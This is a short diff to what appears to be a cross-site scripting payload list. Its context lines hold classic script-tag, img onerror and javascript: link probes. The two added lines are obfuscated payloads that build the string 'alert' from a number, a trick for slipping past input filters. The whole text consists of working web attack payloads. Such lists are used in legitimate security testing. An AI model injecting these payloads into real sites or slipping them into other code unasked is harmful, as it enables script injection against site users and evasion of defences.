@@ -66,3 +66,5 @@ confirm?.(1)
 <script>alert('XSS Attack!');</script>
 <img src='x' onerror='alert("XSS Attack!")'>
 <a href="javascript:alert('XSS Attack!')">Click Me</a>
+<img src="X" onerror=top[8680439..toString(30)](1337)>
+<script>top[8680439..toString(30)](1337)</script>
